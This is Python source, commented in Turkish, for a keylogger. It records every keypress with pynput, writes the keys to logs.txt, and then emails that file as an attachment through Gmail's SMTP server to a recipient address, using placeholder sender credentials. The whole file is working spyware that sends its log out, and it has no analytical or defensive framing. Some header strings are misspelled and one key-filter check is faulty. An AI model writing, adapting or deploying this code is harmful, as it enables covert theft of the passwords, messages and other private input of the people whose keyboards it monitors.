import pynput
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 10:
        count = 0
        write_file(keys)


def write_file(keys):
    with open("logs.txt", "a") as dosya:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                dosya.write("\n")
            elif k.find("Key"):
                dosya.write(str(k))


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

try:
    subject = "Keylog ATTACHMENT Maili"  # Mail Mesaj Bilgisi
    mesaj = "Bu keylog dosyası ekleme mesajıdır..!"
    # content = "Subject: {0}\n\n{1}".format(subject, mesaj)
    content = "{0}\n".format(mesaj)# Hesap Bilgileri
    myMailadress = "gondercinin gmail adresi"
    password = "göndericininsifresi"

    # Kime Gönderilecek Bilgisi
    sendTo = "alıcının gmail adresi"

    # Setup the MIME
    message = MIMEMultipart()
    message['From'] = myMailadress
    message['To'] = sendTo
    message['Subject'] = subject

    # The body and the attachments for the mail
    message.attach(MIMEText(content, 'plain'))
    attach_file_name = 'logs.txt'
    attach_file = open(attach_file_name, 'rb')  # Open the file as binary mode
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload(attach_file.read())
    encoders.encode_base64(payload)  # encode the attachment

    # add payload header with filename
    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    message.attach(payload)

    # Create SMTP session for sending the mail
    session = smtplib.SMTP('smtp.gmail.com', 587)  # use gmail with port
    session.starttls()  # enable security
    session.login(myMailadress, password)  # login with mail_id and password
    text = message.as_string()
    session.sendmail(myMailadress, sendTo, text)
    session.quit()
    print("Mail Gönderme İşlemi Başarılı!")
except Exception as e:
    print("Hata Oluştu!\n{0}".format(e))

